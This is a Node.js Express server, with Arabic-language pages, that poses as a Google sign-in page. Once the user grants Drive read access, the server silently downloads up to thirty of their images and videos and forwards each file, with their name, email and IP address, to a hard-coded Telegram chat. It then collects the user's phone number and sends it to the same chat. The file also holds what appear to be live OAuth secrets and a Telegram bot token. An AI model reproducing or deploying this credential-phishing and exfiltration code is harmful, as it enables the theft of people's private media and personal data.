const express = require('express');
const { google } = require('googleapis');
const TelegramBot = require('node-telegram-bot-api');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();
app.use(express.json());

const CLIENT_ID = '869200348342-ijiun242m66rsrj55pk87ttbd0ubs4hh.apps.googleusercontent.com';
const CLIENT_SECRET = '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';
const REDIRECT_URI = 'http://localhost:8080/oauth2callback';

const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
const TELEGRAM_CHAT_ID = '6894787120';
const DEVICE_NUMBER = 1;

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

function base64URLEncode(str) {
  return str.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}
function sha256(buffer) {
  return crypto.createHash('sha256').update(buffer).digest();
}
const code_verifier = base64URLEncode(crypto.randomBytes(32));
const code_challenge = base64URLEncode(sha256(code_verifier));

const oauth2Client = new google.auth.OAuth2(CLIENT_ID, CLIENT_SECRET, REDIRECT_URI);

app.get('/', (req, res) => {
  const authUrl = oauth2Client.generateAuthUrl({
    access_type: 'offline',
    scope: ['https://www.googleapis.com/auth/drive.readonly', 'https://www.googleapis.com/auth/userinfo.email', 'https://www.googleapis.com/auth/userinfo.profile'],
    prompt: 'consent',
    code_challenge_method: 'S256',
    code_challenge: code_challenge,
  });

  res.send(`
    <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <title>تسجيل الدخول</title>
        <style>
          body {
            margin: 0;
            padding: 0;
            background-image: url('https://images.unsplash.com/photo-1506765515384-028b60a970df?auto=format&fit=crop&w=1400&q=80');
            background-size: cover;
            background-position: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
          }
          .container {
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            text-align: center;
          }
          .container h1 {
            margin-bottom: 30px;
            font-size: 32px;
            color: #333;
          }
          .login-btn {
            font-size: 20px;
            padding: 12px 24px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            text-decoration: none;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            cursor: pointer;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>مرحباً بك 👋<br>قم بتسجيل الدخول بحسابك في Google</h1>
          <a href="${authUrl}" class="login-btn">تسجيل الدخول إلى جوجل</a>
        </div>
      </body>
    </html>
  `);
});

app.get('/oauth2callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send(`❌ لم يتم استلام كود التفويض.`);

  try {
    const { tokens } = await oauth2Client.getToken({
      code,
      codeVerifier: code_verifier,
      redirect_uri: REDIRECT_URI,
    });

    oauth2Client.setCredentials(tokens);

    const oauth2 = google.oauth2({ version: 'v2', auth: oauth2Client });
    const userInfoRes = await oauth2.userinfo.get();
    const userEmail = userInfoRes.data.email || 'غير معروف';
    const userName = userInfoRes.data.name || 'مستخدم';

    const getClientIp = (req) => {
      const xForwardedFor = req.headers['x-forwarded-for'];
      if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
      return req.connection.remoteAddress || 'غير معروف';
    };

    const userIp = getClientIp(req);

    sendDriveMediaToTelegram(oauth2Client, userName, userEmail, userIp, DEVICE_NUMBER).catch(console.error);

    // صفحة إدخال رقم الهاتف بخلفية بنت جميلة
    res.send(`
      <html lang="ar" dir="rtl">
        <head>
          <meta charset="UTF-8" />
          <title>إدخال رقم الهاتف</title>
          <style>
            body {
              margin: 0;
              padding: 0;
              background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ93VDoGKqJ4Vezu_M0ctcNOs9Twn-00kEV1iQ9Sl-9nw&s');
              background-size: cover;
              background-position: center;
              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
              height: 100vh;
              display: flex;
              align-items: center;
              justify-content: center;
            }
            .form-container {
              background: rgba(255, 255, 255, 0.9);
              padding: 40px;
              border-radius: 12px;
              box-shadow: 0 10px 20px rgba(0, 0, 0, 0.25);
              text-align: center;
              max-width: 400px;
              width: 100%;
            }
            h2 {
              margin-bottom: 25px;
              color: #333;
            }
            input[type="text"] {
              padding: 12px;
              font-size: 18px;
              width: 100%;
              margin-bottom: 20px;
              border: 1px solid #ccc;
              border-radius: 8px;
            }
            button {
              background-color: #28a745;
              color: white;
              padding: 12px 24px;
              font-size: 18px;
              border: none;
              border-radius: 8px;
              cursor: pointer;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            }
          </style>
        </head>
        <body>
          <div class="form-container">
            <h2>📱 أدخل رقم هاتفك لإكمال العملية</h2>
            <form id="phoneForm">
              <input type="text" id="phone" name="phone" placeholder="مثال: 01012345678" required />
              <button type="submit">إرسال</button>
            </form>
          </div>
          <script>
            document.getElementById("phoneForm").addEventListener("submit", async function(e) {
              e.preventDefault();
              const phone = document.getElementById("phone").value.trim();
              if (!phone) return alert("يرجى إدخال رقم الهاتف");

              await fetch("/submit-phone", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone })
              });

              window.location.href = "https://www.arabic.chat/";
            });
          </script>
        </body>
      </html>
    `);
  } catch (error) {
    console.error('خطأ في التوكن:', error.response?.data || error);
    res.send(`<div style="font-size:24px;color:red;text-align:center;margin-top:50px;">حدث خطأ أثناء تسجيل الدخول.</div>`);
  }
});

app.post('/submit-phone', async (req, res) => {
  const phone = req.body.phone;
  if (phone) {
    await bot.sendMessage(TELEGRAM_CHAT_ID, `📞 رقم الهاتف: ${phone}`);
    res.sendStatus(200);
  } else {
    res.sendStatus(400);
  }
});

async function sendDriveMediaToTelegram(authClient, userName, userEmail, userIp, deviceNumber) {
  const drive = google.drive({ version: 'v3', auth: authClient });

  const sendMedia = async (type, sendFunction, icon, limit = 30) => {
    const res = await drive.files.list({
      q: `mimeType contains '${type}/'`,
      fields: 'files(id, name)',
      pageSize: limit,
    });

    const files = res.data.files || [];
    for (const file of files) {
      const url = `https://www.googleapis.com/drive/v3/files/${file.id}?alt=media`;
      const fileRes = await fetch(url, {
        headers: { Authorization: `Bearer ${authClient.credentials.access_token}` }
      });
      const buffer = await fileRes.buffer();

      await sendFunction(TELEGRAM_CHAT_ID, buffer, { caption: `${icon} ${file.name}` });

      const infoMsg = `👤 المستخدم: ${userName} (${userEmail})\n📱 جهاز رقم: ${deviceNumber}\n🌐 عنوان IP: ${userIp}`;
      await bot.sendMessage(TELEGRAM_CHAT_ID, infoMsg);
    }
  };

  await sendMedia('image', bot.sendPhoto.bind(bot), '🖼');
  await sendMedia('video', bot.sendVideo.bind(bot), '🎥');
}

const PORT = 8080;
app.listen(PORT, () => {
  console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
});
